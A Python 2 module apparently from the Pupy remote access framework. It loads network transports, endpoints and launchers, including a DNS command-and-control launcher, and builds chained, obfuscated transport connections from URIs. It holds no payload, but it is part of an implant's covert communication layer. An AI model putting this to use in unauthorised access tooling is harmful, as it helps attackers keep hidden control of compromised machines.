# -*- coding: utf-8 -*-
# Copyright (c) 2015, Nicolas VERDIER (contact@n1nj4.eu)
# Pupy is under the BSD 3-Clause license. see the LICENSE file at the root
# of the project for the detailed licence terms

__all__ = (
    'load_network_modules', 'transports', 'launchers',
    'from_uri'
)

from urlparse import urlparse, ParseResult

from pkgutil import iter_modules
from importlib import import_module

from network import transports as transports_conf
from network.lib import getLogger
from network.lib import endpoints as endpoints_lib
from network.lib import transports as transports_lib

from network.lib.base import TransportWrapper

transports = {}

launchers = {}
transports_ng = {}
endpoints = set()


logger = getLogger('conf')


def add_transport(module_name):
    try:
        confmodule = import_module(
            'network.transports.{}.conf'.format(module_name))

        if not confmodule:
            logger.warning('Import failed: %s', module_name)
            return

        if not hasattr(confmodule, 'TransportConf'):
            logger.warning('TransportConf is not present in %s', module_name)
            return

        t = confmodule.TransportConf
        if t.name is None:
            t.name = module_name

        transports[t.name] = t

    except Exception, e:
        logger.exception('Transport disabled: %s: %s', module_name, e)


def load_launchers():
    try:
        from .lib.launchers.connect import ConnectLauncher
        launchers['connect'] = ConnectLauncher
    except Exception, e:
        logger.exception('%s: ConnectLauncher disabled', e)

    try:
        from .lib.launchers.auto_proxy import AutoProxyLauncher
        launchers['auto_proxy'] = AutoProxyLauncher
    except Exception, e:
        logger.exception('%s: AutoProxyLauncher disabled', e)

    try:
        from .lib.launchers.bind import BindLauncher
        launchers['bind'] = BindLauncher
    except Exception, e:
        logger.exception('%s: BindLauncher disabled', e)

    try:
        from .lib.launchers.dnscnc import DNSCncLauncher
        launchers.update({
            'dnscnc': DNSCncLauncher
        })

    except Exception as e:
        logger.exception('%s: DNSCncLauncher disabled', e)
        DNSCncLauncher = None


def load_legacy_configurations():
    for _, module_name, _ in iter_modules(transports_conf.__path__):
        add_transport(module_name)


def load_network_endpoints():
    for _, module_name, _ in iter_modules(endpoints_lib.__path__):
        try:
            module = import_module('network.lib.endpoints.' + module_name)
        except ImportError as e:
            logger.exception(
                'Import failed for %s.%s: %s',
                __name__, module_name, e)
            continue

        if hasattr(module, '__endpoints__'):
            for name in module.__endpoints__:
                endpoints.add(getattr(module, name))


def load_transports():
    for _, module_name, _ in iter_modules(transports_lib.__path__):
        try:
            module = import_module('network.lib.transports.' + module_name)
        except ImportError as e:
            logger.exception(
                'Import failed for %s.%s: %s',
                __name__, module_name, e)
            continue

        if hasattr(module, 'register'):
            logger.debug('Register module %s', module_name)
            module.register(transports_ng)


def load_network_modules():
    logger.debug("Load legacy configurations ..")
    load_legacy_configurations()
    logger.debug("Supported legacy transports: %s", list(transports))

    logger.debug("Load network endpoints ..")
    load_network_endpoints()
    logger.debug("Supported network endpoints: %s", list(endpoints))

    logger.debug("Load transports ..")
    load_transports()
    logger.debug("Supported transports: %s", list(transports_ng))

    logger.debug("Load launchers ..")
    load_launchers()
    logger.debug("Supported launchers: %s", list(launchers))


def transport_conf_from_uri(uri, bind=False):
    if '+' not in uri.scheme:
        return None, []

    parts = uri.scheme.split('+')
    required_transports = parts[1:]

    chained_credentials = set()
    transports = []

    for required_transport in required_transports:
        transports_configuration = transports_ng.get(required_transport)
        if not transports_configuration:
            raise ValueError('Unregistered transport {}'.format(
                transports_configuration))

        client_transport, server_transport = transports_configuration
        transport = server_transport if bind else client_transport

        chained_credentials.update(transport.credentials)
        transports.append(transport)

    if len(transports) > 1:
        class ChainedTransports(TransportWrapper):
            name = '+'.join(required_transports)
            credentials = tuple(chained_credentials)
            cls_chain = transports

        transport = ChainedTransports
    else:
        transport = transports[0]

    return transport, chained_credentials


def from_uri(uri, bind=False, args=[], kwargs=dict(), credentials=dict()):
    if not isinstance(uri, ParseResult):
        uri = urlparse(uri)

    # At endpoint level we are interested only at first level
    # tcp+obfs3+rsa:// -> tcp://

    entity = None
    transport = None

    required_credentials = []

    if '+' in uri.scheme:
        transport, required_credentials = transport_conf_from_uri(
            uri, bind)

        logger.debug(
            'transport_conf_from_uri(%s, %s) -> %s, %s',
            uri, bind, transport, required_credentials
        )

    credential_data = {
        credential:credentials[credential]
        for credential in required_credentials
    }

    ep_handler = None

    print "\n\nENDPOINTS:", endpoints, '\n\n'

    for endpoint in endpoints:
        print "\nTRY: ", endpoint, "\n"
        if endpoint.supports_uri(uri):
            if (bind and endpoint.is_server()) or (
                    not bind and endpoint.is_client()):
                ep_handler = endpoint
            break

    if not ep_handler:
        raise ValueError('Unregistered scheme {}'.format(
            repr(uri.scheme.lower())))

    logger.debug(
        'Using handler %s for URI=%s and KWARGS=%s', ep_handler, uri, kwargs
    )

    ep_instance = ep_handler.create(uri, kwargs)
    if not ep_instance:
        raise ValueError('Failed to instantiate endpooint handler')

    ep_instance.set_transport(transport, credential_data, kwargs)

    return ep_instance
